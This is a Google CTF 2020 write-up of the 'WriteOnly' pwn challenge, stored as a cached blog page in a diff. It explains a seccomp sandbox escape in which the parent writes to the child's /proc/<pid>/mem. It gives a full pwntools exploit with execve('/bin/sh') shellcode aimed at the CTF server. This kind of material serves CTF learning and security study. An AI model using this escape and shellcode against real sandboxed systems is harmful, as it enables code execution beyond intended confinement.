@@ -1,0 +1,174 @@
+I"]\<p>We had a really great time this weekend playing this year’s edition of Google CTF. Although we were able to solve only 2 of the pwn challenges , here’s the intended writeup for the challenge <em>WriteOnly</em>.</p>
+
+<h2 id="tldr">tl;dr</h2>
+
+<p>To begin with , we’re just given a binary and it’s source code. Skimming through the source code , we find the binary being hardened with seccomp bpf filter.</p>
+
+<p>Here’s the list of all the allowed syscalls.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">setup_seccomp</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">scmp_filter_ctx</span> <span class="n">ctx</span><span class="p">;</span>
+  <span class="n">ctx</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="n">SCMP_ACT_KILL</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">write</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">open</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">close</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">stat</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">fstat</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">lstat</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">lseek</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">mprotect</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">brk</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">writev</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">access</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">sched_yield</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">dup</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">dup2</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">clone</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">fork</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">vfork</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">execve</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">exit</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">kill</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">chdir</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">fchdir</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">gettimeofday</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">getuid</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">getgid</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">exit_group</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ret</span> <span class="o">|=</span> <span class="n">seccomp_load</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>A surprise that the challenge has for us is that <code class="language-plaintext highlighter-rouge">Read</code> syscall is <strong>not allowed</strong>.</p>
+
+<h2 id="idea-of-exploit">Idea of exploit</h2>
+
+<p>Again, going through source code , we see a few things happening.</p>
+
+<ul>
+  <li>A child is created which opens and reads 4 bytes of flag constantly.</li>
+  <li>The parent sets up seccomp, asks for a length and takes our shellcode as input and gives us code execution right away.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="n">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">check</span><span class="p">(</span><span class="n">fork</span><span class="p">(),</span> <span class="s">"fork"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">check_flag</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[DEBUG] child pid: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+  <span class="n">void_fn</span> <span class="n">sc</span> <span class="o">=</span> <span class="n">read_shellcode</span><span class="p">();</span>
+  <span class="n">setup_seccomp</span><span class="p">();</span>
+  <span class="n">sc</span><span class="p">();</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>An important thing to notice here is , seccomp is enabled in the parent <strong>after</strong> the child has been created. Hence , the child <strong>does not</strong> inherit seccomp, so how cool is that?</p>
+
+<p>The only thing that we could think of was to somehow <strong>write</strong> to the child’s memory and get code execution in child too. But the question was , what do we write to child and how do we do it?</p>
+
+<h3 id="delving-into-the-exploit">Delving into the exploit</h3>
+
+<p>As suggested by <a href="https://twitter.com/sherl0ck__">Sherl0ck</a>, we could open a pseudo file called <strong>/proc/&lt;pid of child&gt;/mem</strong> and write to any segment of memory of the child , just like editing a binary in plain ghex :P. And what more , the program already prints the PID of child coupled with <strong>PIE</strong> being disabled , hence confirming our approach to exploitation.
+    So now , another question that should pop in our minds now is , where do we write in the memory of child to get code execution? We can blithely overwrite the <strong>return address</strong> of child with our shellcode. There’s another problem , remember that child will die if parent dies , so we have to make sure that the parent is alive throughout our journey of popping shell through child.</p>
+
+<h4 id="overwriting-return-address-of-child">Overwriting return address of child</h4>
+
+<p>tl;dr of the plan is :</p>
+
+<ul>
+  <li>Open <strong>/proc/&lt;pid of child&gt;/mem</strong> with read-write permissions.</li>
+  <li>using <strong>lseek</strong> syscall to seek to the return address of child.</li>
+  <li>Write shellcode to return address and finally loop parent so that it doesn’t die out.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">'writeonly.2020.ctfcompetition.com'</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span><span class="o">=</span><span class="bp">True</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./chal'</span><span class="p">)</span>
+
+<span class="n">reu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">rel</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">re</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="c1">#shellcode for execve /bin/sh
+</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"""
+                mov r9,0x0068732f6e69622f
+                push r9
+                push rsp
+                pop rdi
+                xor rsi,rsi
+                xor rdx,rdx
+                mov rax,0x3b
+                syscall
+                """</span><span class="p">)</span>
+    <span class="n">reu</span><span class="p">(</span><span class="s">'child pid: '</span><span class="p">)</span>
+    <span class="n">pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">rel</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span><span class="mi">10</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'pid -&gt; '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>
+
+    <span class="c1">#Adjusting /proc/pid/mem to 8 bytes and storing on stack
+</span>    <span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">'''
+    mov r9, 0x006d656d2f2f322f
+    push r9
+    mov r9, 0x2f2f636f72702f2f
+    push r9
+    push rsp
+    pop rdi
+    push rax
+    mov r10,rax
+    mov rsi,2
+    mov rdx,0
+    mov rax,2
+    syscall                       #Open file with read-write permissions
+    mov rdi,rax
+    mov r8,rdi
+    mov rax, 8
+    mov rsi,0x00000000004022e3    #lseek requires the address we want to seek to as offset
+    mov rdx,1
+    syscall
+    mov rax,1
+    mov rdi,r8
+    mov rsi,r10
+    add rsi,0x100                 #Fetching shellcode's address into rsi and writing to file
+    mov rdx,0x30
+    syscall
+    loop: jmp loop                #Make sure parent does not die
+            '''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="s">"0x"</span> <span class="o">+</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="o">+</span> <span class="s">'//'</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)))</span>
+    <span class="n">sc</span> <span class="o">=</span> <span class="n">sc</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sc</span> <span class="o">+=</span> <span class="n">shell</span>  
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'sc len : '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'length? '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'shellcode. '</span><span class="p">,</span><span class="n">sc</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The challenge taught me yet another way of escaping seccomp sandbox through writing to child’s memory. kudos to Google CTF for such a good challenge.</p>
+
+:ET
